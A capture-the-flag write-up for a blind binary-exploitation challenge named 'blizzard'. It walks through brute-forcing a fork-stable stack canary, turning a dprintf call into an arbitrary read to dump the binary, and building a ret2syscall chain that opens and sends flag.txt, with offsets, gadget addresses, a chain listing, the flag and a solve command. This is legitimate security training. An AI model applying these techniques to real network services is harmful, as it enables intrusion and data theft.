---
title: "blizzard"
ctf: "CryoVault Finals"
date: 2026-10-24
category: pwn
difficulty: hard
points: 500
flag_format: "isfcr{...}"
author: "OpenCode"
---

# blizzard

## Summary

Blind pwn, no binary supplied. `blizzard` is a TLS-wrapped fork-per-connection
"relay" service. The frame reader has an unchecked length, which allows a stack
overflow of `char buf[88]`. Because the listener forks, the stack canary is
identical across connections until the parent restarts, so the canary is
brute-forced byte by byte with the `relayed <len>.` reply as a liveness oracle.
The saved return address was then recovered with the same oracle, giving RIP
control without any leak.

A behavioural scan of `.text` found a `dprintf(fd, rsi)` call site whose format
pointer is taken from `rsi`. Chaining `pop rsi; ret` into it turns it into an
arbitrary read of a NUL-terminated string (the format buffer), which was used to
dump the whole binary. The dump revealed a deliberately planted gadget block
(`pop rdi/rsi/rdx/rax` + `syscall; ret` at `0x400570-0x400578`) and the string
`"flag.txt"` at `0x4016d8`. The win is a raw `ret2syscall` chain:

```
open("flag.txt", O_RDONLY)
read(3, 0x403200, 0x200)
write(4, 0x403200, 0x200)     # fd 4 = connection
```

Five `isfcr{...d3c0y...}` decoy printers are reachable by jumping into `.text`
(`0x400580` sweep, `0x4005d0` no-arg, `0x400620` text-scan, `0x400670` frozen,
`0x4006c0` whiteout). They are traps and were not reported.

## Solution

### 1. Protocol

TLS on port 443:

```
server -> b"blizzard relay up.\n" b"relay> "
client -> uint16_be length + body
server -> b"relayed <length>.\n" b"relay> "
```

`length == 0` terminates the connection. The body is never echoed.

### 2. Frame layout and canary

A length sweep with a guessed canary shows the reader is:

```
+0    .. +87    char buf[88]        <- read() destination
+88   .. +95    stack canary
+104            saved rbx
+112            saved rbp  (= main's connection fd, 4)
+120            saved r12
+128            saved r13
+136            saved RIP  -> 0x40085d (main's frame loop)
```

The listener forks per connection, so a child inherits the parent's canary.
`main` only prints `relayed <len>.` after the reader returns and the canary
check passes, so "did the reply appear" is a one-bit oracle:

* known prefix + one guessed byte; 256 candidates in parallel;
* exactly one candidate keeps the child alive;
* first byte is always `0x00`.

The parent restarts every ~10-20 minutes and rotates the canary; the exploit
detects a dead prefix and starts over. The saved return address was recovered
the same way: the low byte is `0x5d`, the second byte `0x08`, and the remaining
six bytes are the fixed non-PIE `0x000000000040...`, giving `0x40085d`.

### 3. Finding a read primitive

A jump-to-every-byte scan of `.text` (payload
`buf | canary | saved regs | target | 0x40085d`) produced only the five decoy
printers plus `main`'s banner/prompt code. One address, `0x400871`, leaked six
bytes from whatever `rsi` pointed at. The disassembly later showed it is the
`call dprintf` inside `main`:

```
400865: mov esi, 0x401681      ; "relayed %d.\n"
40086a: mov edi, ebp           ; connection fd
40086c: mov eax, 0
400871: call dprintf
```

Jumping straight to `0x400871` skips the argument setup, so `dprintf(fd, rsi)`
uses our `rsi` as the **format string**. That makes the site a gadget oracle:

```
chain: [candidate gadget][0x400000][0x400871]
  pop rsi; ret -> rsi = 0x400000 -> dprintf prints the ELF header  "\x7fELF\x02\x01\x01"
  pop rdi; ret -> rdi = 0x400000 -> dprintf writes to an invalid fd -> only "relay> "
```

This found `pop rsi; ret @ 0x400572` and `pop rdi; ret @ 0x400570`.

### 4. Dumping the binary

With `pop rsi` the site reads a NUL-terminated string starting at an arbitrary
address. The dumper reads a six-byte window at `addr`; when the result is shorter
than six, the next byte is a NUL and the next read starts after it. (The ELF
header, for example, stops after six bytes at its first NUL.) This recovered the
ELF header, program headers and complete `.text`:

```
entry 0x400480
PT_LOAD 0x400000 filesz 0xa4d   (text)
PT_LOAD 0x401000 filesz 0x960   (rodata)
PT_LOAD 0x402df8 filesz 0x298   (data)
```

`.rodata` contains `"flag.txt"` at `0x4016d8` and the five decoy flags
`0x401590..0x401648`. `.text` ends at `0x400a4d` and contains the planted gadget
block:

```
0x400570  pop rdi ; ret
0x400572  pop rsi ; ret
0x400574  pop rdx ; ret
0x400576  pop rax ; ret
0x400578  syscall ; ret
```

The binary imports no `open`, so the intended win is a raw syscall chain.

### 5. ret2syscall

The child closes the listening socket before entering `main`, so fds 0/1/2 are
inherited and fd 3 is free; the accepted connection is fd 4 (also confirmed by
the saved `rbp` at offset 112). `open("flag.txt")` therefore returns fd 3.
The chain writes the flag into the writable `.bss` page at `0x403200` and sends
it on the connection:

```python
chain = [
    POP_RAX, 2, POP_RDI, FLAG_PATH, POP_RSI, 0, POP_RDX, 0, SYSCALL,   # open
    POP_RAX, 0, POP_RDI, 3, POP_RSI, BSS, POP_RDX, 0x200, SYSCALL,     # read
    POP_RAX, 1, POP_RDI, 4, POP_RSI, BSS, POP_RDX, 0x200, SYSCALL,     # write
    LOOP,
]
```

Payload: `buf[88] | canary | ... | saved rbp=4 | ... | return address = chain`.
The frame is 360 bytes.

Observed output:

```
blizzard relay up.
relay> isfcr{bl1nd_sysc4ll_r0p_0p3n_r34d_wr1t3_bl1zz4rd_7f3c}
```

Plain `system("/bin/sh")` was not needed: the service imports no `system` and
the syscall chain is shorter and works regardless of stdio fds.

The five decoys (`sw33p`, `n0_4rg`, `t3xt_sc4n`, `fr0z3n`, `wh1t30ut`) each print
an `isfcr{...d3c0y...}` string and are rejected as fake.

## Flag

```
isfcr{bl1nd_sysc4ll_r0p_0p3n_r34d_wr1t3_bl1zz4rd_7f3c}
```

## Solve script

`writeups/blizzard/exploit.py` is self-contained: it recovers the fork-stable
canary from scratch (with automatic restart detection), builds the syscall
chain and prints the flag.

```bash
python exploit.py
# or: python exploit.py isfcrpesu-blizzard.chals.io 443
```
